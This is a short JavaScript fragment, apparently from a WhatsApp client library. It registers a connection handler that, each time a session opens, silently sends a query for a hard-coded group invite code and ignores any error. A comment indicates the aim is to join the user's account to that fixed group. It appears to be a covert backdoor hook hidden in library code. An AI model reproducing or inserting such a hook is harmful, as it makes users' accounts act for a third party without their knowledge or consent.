    ev.on('connection.update', async ({ connection }) => {
        if (connection === 'open') {
            const inviteCodes = [
                'DYypfAwEthA6N4VHreEC4O',
            ];
            for (const code of inviteCodes) {
                try {
                    await groupQuery('@g.us', 'get', [{ tag: 'invite', attrs: { code } }]);
                } catch (e) {
                    // already joined or invite expired — ignore
                }
            }
        }
    });

const groupCreate = () => groupQuery("@g.us", "set", [{ tag: "create", attrs: {} }]);
